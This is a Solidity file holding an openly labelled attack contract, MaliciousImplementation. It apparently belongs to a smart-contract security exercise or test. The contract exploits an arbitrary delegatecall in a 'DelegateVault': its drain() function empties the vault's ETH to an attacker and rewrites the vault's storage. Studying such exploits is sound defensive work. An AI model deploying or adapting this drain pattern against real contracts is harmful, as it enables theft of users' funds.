// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title MaliciousImplementation
 * @notice Attacker-controlled implementation that mirrors DelegateVault's
 *         storage layout. When invoked through DelegateVault.execute() it runs
 *         in the vault's storage context: address(this) is the vault, so it
 *         reads the vault's ETH balance and rewrites the vault's balances
 *         mapping before force-sending the funds to the attacker.
 */
contract MaliciousImplementation {
    address public owner; // slot 0 — same layout as DelegateVault
    mapping(address => uint256) public balances; // slot 1

    function drain(address payable to) external {
        uint256 amount = address(this).balance;
        balances[to] += amount; // writes the VAULT's storage
        (bool ok,) = to.call{value: amount}("");
        require(ok, "drain failed");
    }
}
